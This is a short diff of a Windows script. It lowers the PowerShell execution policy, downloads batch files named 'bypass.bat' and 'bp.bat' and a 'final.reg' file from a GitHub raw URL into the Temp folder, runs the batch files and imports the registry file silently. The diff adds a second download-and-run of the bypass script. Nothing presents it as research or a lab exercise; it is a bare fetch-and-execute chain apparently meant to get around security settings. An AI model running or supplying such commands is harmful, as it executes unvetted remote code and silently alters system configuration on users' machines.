@@ -2,6 +2,7 @@
 powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/bypass.bat -O C:\Windows\Temp\bypass.bat"
 cmd /c "C:\Windows\Temp\bypass.bat"
-cmd /c "C:\Windows\Temp\bypass.bat"
+powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/bypass.bat -O C:\Windows\Temp\bp.bat"
+cmd /c "C:\Windows\Temp\bp.bat"
 powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/final.reg -O C:\Windows\Temp\final.reg"
 regedit /s "C:\Windows\Temp\final.reg"
